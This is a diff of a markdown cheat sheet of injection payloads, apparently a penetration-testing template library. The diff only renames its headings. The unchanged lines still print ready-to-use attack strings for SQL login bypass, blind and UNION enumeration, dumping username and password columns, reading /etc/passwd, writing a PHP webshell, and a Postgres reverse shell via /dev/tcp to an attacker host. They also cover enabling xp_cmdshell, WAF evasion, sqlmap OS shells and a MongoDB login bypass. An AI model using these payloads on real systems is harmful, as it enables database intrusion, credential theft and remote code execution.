@@ -6,7 +6,7 @@
 
 ---
 
-## SQLi - Auth Bypass Classic
+## bypass sqli auth classic
 Bypass login by always-true comment.
 
 ```bash
@@ -17,7 +17,7 @@ echo "admin' or 1=1-- -"
 
 ---
 
-## SQLi - Auth Bypass with Hash Stop
+## bypass sqli auth hash comment
 Closes hash style or terminates statement.
 
 ```bash
@@ -28,7 +28,7 @@ echo "admin' or 1=1#"
 
 ---
 
-## SQLi - Auth Bypass No Username
+## bypass sqli auth no username
 Use null/empty user with always-true clause.
 
 ```bash
@@ -39,7 +39,7 @@ echo "' or 0=0 #"
 
 ---
 
-## SQLi - Detect Injection Point
+## detect sqli injection point
 Single quote test to break syntax.
 
 ```bash
@@ -50,7 +50,7 @@ echo "{{PARAM:str:id}}=1'"
 
 ---
 
-## SQLi - Boolean Test (true/false)
+## detect sqli boolean blind
 Compare responses for boolean blind detection.
 
 ```bash
@@ -61,7 +61,7 @@ echo "{{PARAM:str:id}}=1' AND 1=1-- -"
 
 ---
 
-## SQLi - Time-Based Blind (MySQL)
+## detect sqli time based blind mysql
 Detect via SLEEP delay.
 
 ```bash
@@ -72,7 +72,7 @@ echo "{{PARAM:str:id}}=1' AND SLEEP(5)-- -"
 
 ---
 
-## SQLi - Time-Based Blind (PostgreSQL)
+## detect sqli time based blind postgres
 Postgres time delay.
 
 ```bash
@@ -83,7 +83,7 @@ echo "{{PARAM:str:id}}=1'; SELECT pg_sleep(5)-- -"
 
 ---
 
-## SQLi - Time-Based Blind (MSSQL)
+## detect sqli time based blind mssql
 WAITFOR DELAY for SQL Server.
 
 ```bash
@@ -94,7 +94,7 @@ echo "{{PARAM:str:id}}=1'; WAITFOR DELAY '0:0:5'-- -"
 
 ---
 
-## SQLi - Time-Based Blind (Oracle)
+## detect sqli time based blind oracle
 Oracle dbms_pipe time delay.
 
 ```bash
@@ -105,7 +105,7 @@ echo "{{PARAM:str:id}}=1' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)='a"
 
 ---
 
-## SQLi - UNION Find Column Count (ORDER BY)
+## enum sqli union columns order by
 Increment until error.
 
 ```bash
@@ -116,7 +116,7 @@ echo "{{PARAM:str:id}}=1' ORDER BY {{N:int:5}}-- -"
 
 ---
 
-## SQLi - UNION Find Column Count (NULL)
+## enum sqli union columns null
 Increase NULL count to find column number.
 
 ```bash
@@ -127,7 +127,7 @@ echo "{{PARAM:str:id}}=1' UNION SELECT NULL,NULL,NULL-- -"
 
 ---
 
-## SQLi - UNION Banner (MySQL)
+## dump sqli union version mysql
 Get DB version via UNION.
 
 ```bash
@@ -138,7 +138,7 @@ echo "{{PARAM:str:id}}=1' UNION SELECT 1,version(),3-- -"
 
 ---
 
-## SQLi - UNION List Databases (MySQL)
+## enum sqli union databases mysql
 Pull all schemas.
 
 ```bash
@@ -149,7 +149,7 @@ echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(schema_name),5,6,7 FROM
 
 ---
 
-## SQLi - UNION List Tables (MySQL)
+## enum sqli union tables mysql
 List tables for specific DB.
 
 ```bash
@@ -160,7 +160,7 @@ echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(table_name),5,6,7 FROM 
 
 ---
 
-## SQLi - UNION List Columns (MySQL)
+## enum sqli union columns mysql
 List columns of a target table.
 
 ```bash
@@ -171,7 +171,7 @@ echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(column_name),5,6,7 FROM
 
 ---
 
-## SQLi - UNION Dump Data (MySQL)
+## dump sqli union data mysql
 Dump rows from chosen table.
 
 ```bash
@@ -182,7 +182,7 @@ echo "{{PARAM:str:id}}=1 UNION SELECT 1,2,3,group_concat(username,0x3a,password)
 
 ---
 
-## SQLi - Error-Based ExtractValue (MySQL)
+## dump sqli error based extractvalue mysql
 Trigger error to leak data.
 
 ```bash
@@ -193,7 +193,7 @@ echo "{{PARAM:str:id}}=1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- 
 
 ---
 
-## SQLi - Error-Based UpdateXML (MySQL)
+## dump sqli error based updatexml mysql
 Same idea via UPDATEXML.
 
 ```bash
@@ -204,7 +204,7 @@ echo "{{PARAM:str:id}}=1' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -"
 
 ---
 
-## SQLi - Read File (MySQL LOAD_FILE)
+## sqli read file load_file mysql
 Read server file via LOAD_FILE — needs FILE priv.
 
 ```bash
@@ -215,7 +215,7 @@ echo "{{PARAM:str:id}}=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
 
 ---
 
-## SQLi - Write Webshell (MySQL INTO OUTFILE)
+## sqli write webshell outfile mysql
 Drop PHP shell to webroot.
 
 ```bash
@@ -226,7 +226,7 @@ echo "{{PARAM:str:id}}=1 UNION SELECT '<?php system(\$_GET[0]); ?>',2,3 INTO OUT
 
 ---
 
-## SQLi - PostgreSQL RCE (COPY PROGRAM)
+## sqli rce copy program postgres
 Reverse shell via COPY TO PROGRAM.
 
 ```bash
@@ -237,7 +237,7 @@ echo "COPY (SELECT '') to PROGRAM 'bash -c \"bash -i >& /dev/tcp/{{LHOST:ip}}/{{
 
 ---
 
-## SQLi - MSSQL xp_cmdshell
+## sqli rce xp_cmdshell mssql
 Enable + run OS command via xp_cmdshell.
 
 ```bash
@@ -248,7 +248,7 @@ echo "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_confi
 
 ---
 
-## SQLi - WAF Bypass: Inline Comments
+## bypass sqli WAF inline comments
 Break keywords with /**/ comments.
 
 ```bash
@@ -259,7 +259,7 @@ echo "UN/**/ION SE/**/LECT 1,2,3-- -"
 
 ---
 
-## SQLi - WAF Bypass: Mixed Case + URL Encode
+## bypass sqli WAF mixed case url encode
 Bypass naive filters.
 
 ```bash
@@ -270,7 +270,7 @@ echo "%55nIoN%20%53eLeCt%201,2,3--%20-"
 
 ---
 
-## SQLi - WAF Bypass: Char Encoding
+## bypass sqli WAF char encoding
 Use CHAR()/CONCAT to avoid quoted strings.
 
 ```bash
@@ -281,7 +281,7 @@ echo "UNION SELECT CHAR(97,100,109,105,110)-- -"
 
 ---
 
-## SQLi - sqlmap from Burp Request
+## sqli sqlmap burp request
 Run sqlmap against saved Burp request.
 
 ```bash
@@ -292,7 +292,7 @@ sqlmap -r {{REQFILE:file:request.req}} --batch --level 5 --risk 3 --dbs
 
 ---
 
-## SQLi - sqlmap Read Local File
+## sqli sqlmap read file
 Read file via sqlmap.
 
 ```bash
@@ -303,7 +303,7 @@ sqlmap -r {{REQFILE:file:request.req}} --batch --file-read=/etc/passwd
 
 ---
 
-## SQLi - sqlmap OS Shell
+## sqli sqlmap os shell rce
 Drop OS shell over the SQLi.
 
 ```bash
@@ -314,7 +314,7 @@ sqlmap -r {{REQFILE:file:request.req}} --batch --os-shell
 
 ---
 
-## SQLi - sqlmap Specific Technique
+## sqli sqlmap specific technique
 Force only the listed techniques (B/E/U/S/T/Q).
 
 ```bash
@@ -325,7 +325,7 @@ sqlmap -r {{REQFILE:file:request.req}} --batch --technique=UE -D {{DB:str:hotel}
 
 ---
 
-## NoSQL - Login Bypass (MongoDB)
+## bypass nosqli login mongodb
 Use $ne to bypass login JSON.
 
 ```bash
@@ -336,7 +336,7 @@ echo '{"username":{"$ne":null},"password":{"$ne":null}}'
 
 ---
 
-## NoSQL - Regex Brute (MongoDB)
+## brute nosqli regex mongodb
 Iterate regex to extract password char by char.
 
 ```bash
